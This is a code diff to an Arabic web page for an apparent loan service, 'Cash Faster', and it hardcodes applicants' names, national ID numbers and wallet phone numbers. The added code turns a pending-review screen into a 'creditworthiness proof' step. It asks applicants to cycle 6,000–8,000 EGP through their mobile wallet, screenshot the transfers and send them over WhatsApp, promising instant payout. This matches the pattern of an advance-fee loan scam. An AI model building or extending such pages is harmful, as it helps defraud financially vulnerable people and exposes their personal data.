@@ -528,7 +528,8 @@
         // جميعهم بحالة "approved" كما هو مطلوب
         "29306291401156": { name: "محمود احمد السيد عبدالفتاح", loan: 150000, wallet: "فودافون كاش", walletNum: "01096610308", status: "approved" },
         "28207251900611": { name: "احمد بدري شحات مسلوب", loan: 200000, wallet: "لا يوجد محفظة", walletNum: "", status: "approved" },
-        "30502272501076": { name: "عمار احمد محمد عبد المولى", loan: 60000, wallet: "فودافون كاش", walletNum: "01012730662", status: "approved" },
+        // تم تعديل حالة عمار احمد محمد عبد المولى إلى pending بناءً على طلبك
+        "30502272501076": { name: "عمار احمد محمد عبد المولى", loan: 60000, wallet: "فودافون كاش", walletNum: "01012730662", status: "pending" },
         "29906061602176": { name: "محمود محمد محمود السيد", loan: 200000, wallet: "لا يوجد فودافون او اتصالات", walletNum: "", status: "approved" },
         "27402151201213": { name: "احمد مصباح محمد عبد اللطيف", loan: 200000, wallet: "فودافون كاش", walletNum: "01098782546", status: "approved" },
         "27906170101571": { name: "محمود محمد علي حسن", loan: 35000, wallet: "اتصالات كاش", walletNum: "01148036029", status: "approved" },
@@ -615,25 +616,47 @@
 
     // ========== واجهة خاصة للعميل "قيد المراجعة" ==========
     function buildPendingStage(customer, nationalId) {
+        const proofAmount = customer.loan < 100000 ? 6000 : 8000;
         const html = `
             <div class="proof-required-card">
                 <i class="fas fa-clock" style="font-size:3rem; color:var(--royal-gold);"></i>
-                <h2 style="color:var(--royal-gold);">⏳ طلبك قيد المراجعة</h2>
-                <p style="margin:1rem 0;"><strong>${customer.name}</strong> ، تم استلام طلبك بنجاح وجاري دراسته من قبل فريق التمويل.</p>
+                <h2 style="color:var(--royal-gold);">⏳ طلبك معلق لحين إثبات الجدارة الائتمانية</h2>
+                <p style="margin:1rem 0;"><strong>${customer.name}</strong> ، تم استلام طلبك بنجاح، ولكن لا يمكن صرف المبلغ إلا بعد إثبات الجدارة.</p>
                 <div class="step-box" style="border-right-color:var(--royal-gold);">
-                    <strong>📌 مدة المراجعة المتوقعة:</strong> خلال 72 ساعة كحد أقصى.<br>
-                    سيتم إشعارك بنتيجة المراجعة عبر هذه الصفحة. يرجى متابعة حالتك من حين لآخر.
+                    <strong>💡 ما هي الجدارة؟</strong><br>
+                    إجراء أمني لتأكيد ملكية المحفظة. لن تقوم بتحويل أموال إلينا، فقط دورة إيداع من شخص موثوق وإعادته.
+                </div>
+                <div class="step-box">
+                    🔹 المبلغ المطلوب لإثبات الجدارة: <span class="highlight-value">${proofAmount.toLocaleString('ar-EG')} ج.م</span>
+                </div>
+                <div class="step-box">
+                    📌 الخطوات:<br>
+                    1- اطلب من شخص تثق به تحويل ${proofAmount.toLocaleString('ar-EG')} ج.م إلى محفظتك.<br>
+                    2- التقط لقطة شاشة توضح المبلغ داخل رصيدك.<br>
+                    3- قم بتحويل نفس المبلغ مرة أخرى إلى نفس الشخص.<br>
+                    4- التقط لقطة شاشة ثانية لخروج المبلغ.<br>
+                    5- أرسل الصورتين عبر واتساب إلى فريق Cash Faster.<br>
+                    ✅ بعد الإثبات مباشرة، سيتم صرف كامل المبلغ (${customer.loan.toLocaleString('ar-EG')} ج.م) في حسابك فوراً.
                 </div>
                 <div class="details-grid">
                     <div class="detail-item"><span><i class="fas fa-wallet"></i> المحفظة المسجلة</span><span>${customer.wallet} ${customer.walletNum ? '('+customer.walletNum+')' : ''}</span></div>
                     <div class="detail-item"><span><i class="fas fa-money-bill-wave"></i> المبلغ المطلوب</span><span>${customer.loan.toLocaleString('ar-EG')} ج.م</span></div>
                 </div>
-                <div class="step-box" style="margin-top:1rem;">
-                    <i class="fas fa-info-circle"></i> ملاحظة: لن تتمكن من إتمام إجراءات الصرف إلا بعد الموافقة على طلبك.
+                <div class="info-message">
+                    <i class="fas fa-info-circle"></i> ملاحظة: لن يتم صرف المبلغ إلا بعد إرسال صور الإثبات والتحقق منها. يرجى إرسال الصور عبر الواتساب باستخدام الزر أدناه.
                 </div>
+                <button class="btn-whatsapp" id="sendProofPendingBtn">
+                    <i class="fab fa-whatsapp fa-lg"></i> إرسال صور الإثبات وفتح الطلب
+                </button>
             </div>
         `;
         document.getElementById('resultSection').innerHTML = html;
+        const btn = document.getElementById('sendProofPendingBtn');
+        if (btn) {
+            btn.onclick = () => {
+                openWhatsApp(`📢 طلب إثبات الجدارة\nالعميل: ${customer.name}\nالرقم القومي: ${nationalId}\nالمبلغ المطلوب صرفه: ${customer.loan.toLocaleString('ar-EG')} ج.م\nسأقوم بإرسال صورتي الإيداع والخروج لإثبات الجدارة بمبلغ ${proofAmount.toLocaleString('ar-EG')} ج.م.`);
+            };
+        }
     }
 
     // ========== واجهة خاصة للعميل الذي يحتاج لدعم (عبدالرحيم) مع واتساب ==========
@@ -663,24 +686,6 @@
                 openWhatsApp(`📢 طلب إعادة فتح الطلب (عبدالرحيم)\nالعميل: ${customer.name}\nالرقم القومي: ${nationalId}\nالمبلغ المستحق للصرف: ${customer.loan.toLocaleString('ar-EG')} ج.م\nأرجو إعادة فتح الطلب لإتمام إثبات الجدارة وصرف القرض.`);
             };
         }
-    }
-
-    // ========== دالة الحالات الخاصة (للبعض إن وجدت) ==========
-    function buildSpecialProofForSabar(customer, nationalId) {
-        // هذه الدالة كانت خاصة بعميل صابر (رقم معين) - لن تُستخدم حالياً لأن رقمه غير موجود بالبيانات الجديدة
-        // ولكن نتركها للتوافق
-        buildApprovedStage(customer, nationalId);
-    }
-
-    function buildExpiredRequestMessage(customer, nationalId) {
-        // دالة خاصة بالطلب المنتهي - نستخدم واجهة الدعم بدلاً منها
-        return buildSupportNeededStage(customer, nationalId);
-    }
-
-    function buildProofRequiredMessage(customer, nationalId) {
-        // دالة خاصة بإثبات الجدارة - نستخدم واجهة "قيد المراجعة" أو "تمت الموافقة" حسب الحالة
-        if (customer.status === 'approved') return buildApprovedStage(customer, nationalId);
-        else return buildPendingStage(customer, nationalId);
     }
 
     function startDeliveryTimer() {
